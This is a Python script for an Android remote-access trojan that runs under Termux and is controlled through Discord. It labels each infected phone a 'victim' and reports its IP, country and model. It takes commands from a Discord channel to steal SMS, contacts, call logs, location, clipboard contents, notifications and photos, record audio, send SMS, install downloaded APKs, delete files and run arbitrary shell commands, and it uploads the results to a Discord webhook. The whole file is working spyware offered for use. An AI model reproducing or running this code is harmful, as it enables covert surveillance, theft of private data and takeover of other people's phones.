import os
import socket
import requests
import json
import time
import subprocess
import shutil
import zipfile
import io
import base64
from uuid import getnode as get_mac

def install_tools():
    tools = ["termux-api", "openssh", "curl", "wget", "net-tools", "ffmpeg", "imagemagick", "termux-tts-engine", "termux-battery-status", "unzip", "zip", "tar", "git"]
    for tool in tools:
        os.system(f"pkg install -y {tool} > /dev/null 2>&1")
    os.system("termux-setup-storage > /dev/null 2>&1")

def get_device_info():
    try:
        ip = requests.get('https://api.ipify.org', timeout=5).text
        country = requests.get(f'https://ipapi.co/{ip}/country_name/', timeout=5).text
        model = subprocess.check_output(["getprop", "ro.product.model"]).decode().strip()
        mac = str(get_mac())
        return {"id": mac, "ip": ip, "country": country, "model": model}
    except:
        return {"id": "unknown", "ip": "unknown", "country": "unknown", "model": "unknown"}

def send_to_discord(message):
    webhook_url = "your discord webhook URL (put it here)"
    requests.post(webhook_url, json={"content": message})

def execute_command(command, device_id):
    try:
        if command.startswith("get_sms"):
            output = subprocess.check_output(["termux-sms-list"], stderr=subprocess.STDOUT).decode()
        elif command.startswith("get_location"):
            output = subprocess.check_output(["termux-location"], stderr=subprocess.STDOUT).decode()
        elif command.startswith("take_photo"):
            os.system("termux-camera-photo -c 0 /sdcard/photo.jpg > /dev/null 2>&1")
            with open("/sdcard/photo.jpg", "rb") as f:
                files = {"file": ("photo.jpg", f.read())}
                requests.post("YOUR_DISCORD_WEBHOOK_URL", files=files)
            output = "Photo sent."
        elif command.startswith("extract_photos"):
            os.system("mkdir -p /sdcard/extracted_photos > /dev/null 2>&1")
            os.system("cp -r /sdcard/DCIM/* /sdcard/extracted_photos/ > /dev/null 2>&1")
            shutil.make_archive("/sdcard/extracted_photos", 'zip', "/sdcard/extracted_photos")
            with open("/sdcard/extracted_photos.zip", "rb") as f:
                files = {"file": ("extracted_photos.zip", f.read())}
                requests.post("YOUR_DISCORD_WEBHOOK_URL", files=files)
            output = "Photos extracted and sent."
        elif command.startswith("get_contacts"):
            output = subprocess.check_output(["termux-contact-list"], stderr=subprocess.STDOUT).decode()
        elif command.startswith("get_call_logs"):
            output = subprocess.check_output(["termux-call-log"], stderr=subprocess.STDOUT).decode()
        elif command.startswith("get_wifi"):
            output = subprocess.check_output(["termux-wifi-scaninfo"], stderr=subprocess.STDOUT).decode()
        elif command.startswith("get_battery"):
            output = subprocess.check_output(["termux-battery-status"], stderr=subprocess.STDOUT).decode()
        elif command.startswith("record_audio"):
            os.system("termux-microphone-record -l 10 -f /sdcard/audio.mp3 > /dev/null 2>&1")
            with open("/sdcard/audio.mp3", "rb") as f:
                files = {"file": ("audio.mp3", f.read())}
                requests.post("YOUR_DISCORD_WEBHOOK_URL", files=files)
            output = "Audio recording sent."
        elif command.startswith("get_apps"):
            output = subprocess.check_output(["pm", "list", "packages"], stderr=subprocess.STDOUT).decode()
        elif command.startswith("get_storage"):
            output = subprocess.check_output(["df", "-h"], stderr=subprocess.STDOUT).decode()
        elif command.startswith("speak"):
            text = command.split(" ", 1)[1]
            os.system(f"termux-tts-speak '{text}' > /dev/null 2>&1")
            output = f"Spoke: {text}"
        elif command.startswith("vibrate"):
            os.system("termux-vibrate -d 1000 > /dev/null 2>&1")
            output = "Device vibrated."
        elif command.startswith("screen_on"):
            os.system("input keyevent KEYCODE_WAKEUP > /dev/null 2>&1")
            output = "Screen turned on."
        elif command.startswith("screen_off"):
            os.system("input keyevent KEYCODE_POWER > /dev/null 2>&1")
            output = "Screen turned off."
        elif command.startswith("install_app"):
            url = command.split(" ", 1)[1]
            apk_name = url.split("/")[-1]
            os.system(f"wget {url} -O /sdcard/{apk_name} > /dev/null 2>&1")
            os.system(f"termux-open /sdcard/{apk_name} > /dev/null 2>&1")
            output = f"App installed: {apk_name}"
        elif command.startswith("uninstall_app"):
            package_name = command.split(" ", 1)[1]
            os.system(f"pm uninstall {package_name} > /dev/null 2>&1")
            output = f"Uninstalled: {package_name}"
        elif command.startswith("open_app"):
            package_name = command.split(" ", 1)[1]
            os.system(f"monkey -p {package_name} -c android.intent.category.LAUNCHER 1 > /dev/null 2>&1")
            output = f"Opened: {package_name}"
        elif command.startswith("get_clipboard"):
            output = subprocess.check_output(["termux-clipboard-get"], stderr=subprocess.STDOUT).decode()
        elif command.startswith("set_clipboard"):
            text = command.split(" ", 1)[1]
            os.system(f"echo '{text}' | termux-clipboard-set > /dev/null 2>&1")
            output = f"Clipboard set to: {text}"
        elif command.startswith("get_notifications"):
            output = subprocess.check_output(["termux-notification-list"], stderr=subprocess.STDOUT).decode()
        elif command.startswith("send_sms"):
            parts = command.split(" ")
            number = parts[1]
            message = " ".join(parts[2:])
            os.system(f"termux-sms-send -n {number} '{message}' > /dev/null 2>&1")
            output = f"SMS sent to {number}"
        elif command.startswith("get_device_info"):
            output = f"""
Device Info:
ID: {device_id}
IP: {get_device_info()['ip']}
Country: {get_device_info()['country']}
Model: {get_device_info()['model']}
"""
        elif command.startswith("download_file"):
            url = command.split(" ", 1)[1]
            filename = url.split("/")[-1]
            os.system(f"wget {url} -O /sdcard/Download/{filename} > /dev/null 2>&1")
            output = f"Downloaded: {filename}"
        elif command.startswith("upload_file"):
            filepath = command.split(" ", 1)[1]
            with open(filepath, "rb") as f:
                files = {"file": (filepath.split("/")[-1], f.read())}
                requests.post("YOUR_DISCORD_WEBHOOK_URL", files=files)
            output = f"Uploaded: {filepath}"
        elif command.startswith("list_files"):
            directory = command.split(" ", 1)[1] if len(command.split(" ")) > 1 else "/sdcard"
            output = subprocess.check_output(["ls", directory], stderr=subprocess.STDOUT).decode()
        elif command.startswith("delete_file"):
            filepath = command.split(" ", 1)[1]
            os.system(f"rm {filepath} > /dev/null 2>&1")
            output = f"Deleted: {filepath}"
        else:
            output = subprocess.check_output(command.split(), stderr=subprocess.STDOUT).decode()
        send_to_discord(f"**Command Output ({device_id}):**\n```{output}```")
    except Exception as e:
        send_to_discord(f"**Error executing command:** {str(e)}")

def listen_for_commands(device_id):
    bot_token = "put your bot token here"
    channel_id = "basically put the channel Id here"
    last_message_id = None
    while True:
        try:
            headers = {"Authorization": f"Bot {bot_token}"}
            response = requests.get(f"https://discord.com/api/v9/channels/{channel_id}/messages?limit=1", headers=headers)
            latest_message = response.json()[0]
            if last_message_id != latest_message["id"]:
                last_message_id = latest_message["id"]
                if f"<@{BOT_ID}>" in latest_message["content"]:
                    command = latest_message["content"].replace(f"<@{BOT_ID}>", "").strip()
                    execute_command(command, device_id)
        except:
            pass
        time.sleep(5)

if __name__ == "__main__":
    install_tools()
    data = get_device_info()
    send_to_discord(f"""
**New Victim Connected:**
**ID:** {data['id']}
**IP:** {data['ip']}
**Country:** {data['country']}
**Model:** {data['model']}
""")
    listen_for_commands(data['id'])
